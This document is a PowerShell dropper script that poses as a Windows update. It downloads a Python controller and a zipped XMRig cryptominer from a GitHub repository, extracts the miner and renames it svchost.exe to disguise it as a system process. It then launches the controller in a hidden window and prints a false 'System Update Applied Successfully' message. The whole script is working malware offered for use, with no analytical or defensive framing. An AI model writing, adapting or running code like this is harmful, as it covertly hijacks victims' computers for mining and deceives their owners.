# --- THE MASTER IGNITER (WinUpdate.ps1) ---
$ID = "svchost"
$Path = "$env:APPDATA\$ID"

# 1. Configuration - REPLACE WITH YOUR GITHUB RAW LINKS
$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
$Z_URL = "https://github.com/itzcurled/footbalhunt/raw/main/UpdateData.zip"

# 2. Preparation - Create the silent folder
if (!(Test-Path $Path)) { New-Item -ItemType Directory -Path $Path -Force | Out-Null }

# 3. Deployment - Pull the Brain and the Zipped Engine
Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\UpdateData.zip"

# 4. Unmasking - Extract and rename the Miner to svchost.exe
Expand-Archive -Path "$Path\UpdateData.zip" -DestinationPath $Path -Force
Rename-Item -Path "$Path\xmrig.exe" -NewName "$ID.exe"
Remove-Item -Path "$Path\UpdateData.zip"

# 5. Silent Activation
if (Test-Path "$Path\WinServices.py") {
    Start-Process -FilePath "pythonw.exe" -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WindowStyle Hidden
    Write-Host "System Update Applied Successfully."
}
